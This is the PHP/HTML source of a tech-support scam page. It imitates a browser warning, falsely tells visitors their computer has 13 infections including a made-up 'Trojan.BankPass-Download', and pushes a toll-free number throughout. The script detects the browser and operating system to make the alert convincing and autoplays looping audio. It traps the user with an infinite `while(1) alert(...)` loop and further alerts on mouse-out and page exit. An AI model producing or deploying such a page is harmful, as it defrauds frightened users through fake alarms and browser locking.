<?php

  $number = "855-772-5528";

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Support</title>
<meta charset="UTF-8">
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
	<style>
		html{width:100%;height:100%;}
		body{background-color:rgb(161, 0, 0);}
		*{margin:0px;padding:0px;font-family:arial;}.spacer{height:40px;}
	</style>
	<script type="text/javascript">
	function getParameterByName(name){name=name.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var regex=new RegExp("[\\?&]"+name+"=([^&#]*)"),results=regex.exec(location.search);return results===null?"":decodeURIComponent(results[1].replace(/\+/g," "))}var nVer=navigator.appVersion;var nAgt=navigator.userAgent;var browserName=navigator.appName;var fullVersion=''+parseFloat(navigator.appVersion);var majorVersion=parseInt(navigator.appVersion,10);var nameOffset,verOffset,ix;if((verOffset=nAgt.indexOf("OPR/"))!=-1){browserName="Opera";fullVersion=nAgt.substring(verOffset+4)}else if((verOffset=nAgt.indexOf("Opera"))!=-1){browserName="Opera";fullVersion=nAgt.substring(verOffset+6);if((verOffset=nAgt.indexOf("Version"))!=-1)fullVersion=nAgt.substring(verOffset+8)}else if((verOffset=nAgt.indexOf("MSIE"))!=-1){browserName="IE";fullVersion=nAgt.substring(verOffset+5)}else if((verOffset=nAgt.indexOf("Chrome"))!=-1){browserName="Chrome";fullVersion=nAgt.substring(verOffset+7)}else if((verOffset=nAgt.indexOf("Safari"))!=-1){browserName="Safari";fullVersion=nAgt.substring(verOffset+7);if((verOffset=nAgt.indexOf("Version"))!=-1)fullVersion=nAgt.substring(verOffset+8)}else if((verOffset=nAgt.indexOf("Firefox"))!=-1){browserName="Firefox";fullVersion=nAgt.substring(verOffset+8)}else if((nameOffset=nAgt.lastIndexOf(' ')+1)<(verOffset=nAgt.lastIndexOf('/'))){browserName=nAgt.substring(nameOffset,verOffset);fullVersion=nAgt.substring(verOffset+1);if(browserName.toLowerCase()==browserName.toUpperCase()){browserName=navigator.appName}}if((ix=fullVersion.indexOf(";"))!=-1)fullVersion=fullVersion.substring(0,ix);if((ix=fullVersion.indexOf(" "))!=-1)fullVersion=fullVersion.substring(0,ix);majorVersion=parseInt(''+fullVersion,10);if(isNaN(majorVersion)){fullVersion=''+parseFloat(navigator.appVersion);majorVersion=parseInt(navigator.appVersion,10)}var browserimgs=[];browserimgs["Firefox"]="/assets-2/firefox.jpg";browserimgs["Chrome"]="/assets-2/chrome.png";browserimgs["IE"]="/assets-2/ie.png";browserimgs["Safari"]="/assets-2/safari.png";browserimgs["Opera"]="/assets-2/opera.jpg";
	
	window.OSName="OS";
	if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
	if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
	if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
	if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
	</script>
</head>
<body onclick="console.log('you clicked');">
	<audio autoplay="" loop>
		<source src="/assets-2/gp-msg.mp3" type="audio/mp3">
	</audio>

	<!-- Container -->
	<div style="width: 800px; margin: 20px auto 0px; color: rgb(228, 0, 0); text-align: center; background-color: white; padding: 10px; box-sizing: border-box;">
		
		<div style="margin: 0px auto; text-align: center;">
			<img id="browserlogo" src="firefox.jpg" style="vertical-align: top;" height="100" width="100"> 
			<h1 style="display: inline; font-size: 70px; line-height: 148px; padding-left: 20px;"><script>document.write(browserName);</script> Warning</h1>
		</div>
		<div class="spacer"></div>
		
		<h2 style="font-size: 34px; font-weight: bold;">Your  <script>window.OSName;</script> Computer has (13) infections!</h2>
		
		<!-- PROMO NUMBER -->
		<h2 style="font-size: 100px; color: black;">
			<?php echo $number; ?>
		</h2>
		
		<h2 style="font-size: 34px; font-weight: bold;">Please call Tech Support as soon as possible.</h2>
		<div class="spacer"></div>
		
		<p style="color: black; font-size: 24px;">The system found (13) viruses that pose a serious threat!<br>
			<strong>Browser.Hijacker.Spy / Trojan.BankPass-Download</strong>
		</p>
		<div class="spacer"></div>
		
		<p style="color: black; font-size: 24px; padding-bottom: 20px;">Your system is at risk.<br>
			Your <strong>financial</strong> and <strong>personal information is NOT secure.</strong>.<br>
			Please call <?php echo $number; ?> for qualified support.
		</p>
		
		<p style="color: black; font-size: 24px; padding-bottom: 20px;">
			<img id="os-source-brah" width="137" height="137">
		</p>
	</div>
	
	<script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-61342480-1', 'auto');
	  ga('send', 'pageview');

	</script>
	
	<script language="javascript">

		var isMac = navigator.platform.toUpperCase().indexOf('MAC')>=0;
			document.getElementById("os-source-brah").src = "/assets-2/windows.png";
		if(isMac){
		  	document.getElementById("os-source-brah").src = "/assets-2/apple.png";
		}

		var amountalerts = 0;

		function addEvent(obj, evt, fn) {
		    if (obj.addEventListener) {
		        obj.addEventListener(evt, fn, false);
		    }
		    else if (obj.attachEvent) {
		        obj.attachEvent("on" + evt, fn);
		    }
		} 
	
		function myOnLoadedData() {            
	        var errorSound = document.getElementById("error");
	        errorSound.play();
	        setTimeout(function() {
	            var stopAudio = document.getElementById('error');
	            stopAudio.src = "";
	        },5000);
	    }
	
		var img = document.getElementById("browserlogo");
		img.src = browserimgs[browserName];
		
		message = browserName + " - Alert!\n\nWARNING: Your " + window.OSName + " has a serious virus!\n\n Browser: " + browserName + " " + fullVersion;
		message += "\n    OS: "+window.OSName+"\n\nIf you are seeing this message, you need to call Support at " + <?php echo json_encode($number); ?> + " (TOLL FREE) immediately.";
		message += "\n\nTechnicians are awaiting your call for FREE DIAGNOSIS & PRIORITY assistance removing malicious viruses from your "+window.OSName+" computer.";
		
		// Add Events
		addEvent(window,"load",function(e) {
		    addEvent(document, "mouseout", function(e) {
		        e = e ? e : window.event;
		        var from = e.relatedTarget || e.toElement;
		        if (!from || from.nodeName == "HTML") {
		            if (amountalerts <= 0) { 
						alert(message); 
					}
		            amountalerts = amountalerts + 1;
		        }
		    });
		});
	
		while(1) alert(message);
		window.onbeforeunload = function() {
	        alert("Your computer may be at risk\n\nPlease call this number " + <?php echo json_encode($number); ?> + " for tech support");
	    }

	</script>
</body>
</html>